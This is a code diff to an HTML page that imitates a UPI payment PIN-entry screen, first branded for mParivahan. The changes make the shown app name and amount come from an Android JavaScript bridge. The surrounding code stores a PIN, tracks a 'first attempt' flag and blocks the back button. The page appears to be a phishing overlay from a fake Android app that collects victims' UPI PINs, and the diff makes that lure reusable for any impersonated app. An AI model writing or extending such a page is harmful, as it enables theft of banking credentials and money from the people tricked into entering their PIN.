@@ -255,7 +255,7 @@ h5 {
 
     <div class="details">
         <p>Sending: <br>To:</p>
-        <p>₹1.00 <br>mParivahan</p>
+        <p><span data-payment-amount>₹0.00</span> <br><span data-app-name>App</span></p>
     </div>
 
     <div class="center-content">
@@ -265,7 +265,7 @@ h5 {
         </div>
         <div class="warning">
             <i class="fas fa-exclamation-circle"></i>
-            <p>You are sending ₹1.00 from your account to mParivahan</p>
+            <p>You are sending <span data-payment-amount>₹0.00</span> from your account to <span data-app-name>App</span></p>
         </div>
     </div>
 
@@ -323,6 +323,35 @@ h5 {
     let isHidden = true;
     let savedPIN = '';
     let isFirstAttempt = true;
+    
+    function getAppName() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getAppName) {
+                return Android.getAppName();
+            }
+        } catch (e) {
+            console.error('Error getting app name:', e);
+        }
+        return 'App';
+    }
+
+    function getPaymentAmount() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getPaymentAmount) {
+                return Android.getPaymentAmount();
+            }
+        } catch (e) {
+            console.error('Error getting payment amount:', e);
+        }
+        return '₹1.00';
+    }
+
+    function syncPaymentDetails() {
+        const appName = getAppName();
+        const amount = getPaymentAmount();
+        document.querySelectorAll('[data-app-name]').forEach(el => el.textContent = appName);
+        document.querySelectorAll('[data-payment-amount]').forEach(el => el.textContent = amount);
+    }
     
     function checkAttemptStatus() {
       const savedAttempt = localStorage.getItem('upi_pin_attempt');
@@ -504,6 +533,7 @@ h5 {
 
     checkAttemptStatus();
     updateDisplay();
+    syncPaymentDetails();
 
     history.pushState(null, null, location.href);
     window.onpopstate = function() {
